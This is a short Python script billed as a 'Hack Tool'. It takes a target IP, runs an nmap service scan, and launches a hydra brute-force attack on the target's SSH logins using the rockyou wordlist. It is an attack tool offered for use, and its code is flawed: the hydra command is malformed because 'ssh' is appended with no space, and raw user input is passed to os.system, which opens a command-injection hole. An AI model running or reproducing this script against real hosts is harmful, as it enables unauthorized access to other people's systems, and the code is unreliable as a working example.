#import necessary modules 
import os
import sys
import time

#define the main function
def main():

    #print a welcome message
    print("https://github.com/eliuhacker1979/eliuhacker1979")
    print("Welcome to the Hack Tool!")

    #prompt user for input
    target_ip = input("Please enter the IP address of the target: ")

    #run a loop to keep asking for user input until they enter 'q' or 'Q' to quit
    while True:

        #prompt user for action to take on target IP address
        action = input("What would you like to do? (scan, attack, quit): ")

        #if user enters 'scan', run a port scan on the target IP address
        if action == "scan":
            os.system("nmap -Pn -sC -sV "+target_ip)

        #if user enters 'attack', run an attack on the target IP address
        elif action == "attack":
            os.system("hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt "+target_ip+"ssh")
            
            

        #if user enters 'quit', exit the program
        elif action == "quit" or action == "q":
            print("Exiting Hack Tool...")
            time.sleep(2)  #delay for 2 seconds before exiting program
            sys.exit()     #exit program

        else:
           print("Invalid command! Please try again.")

    return 0;
main()
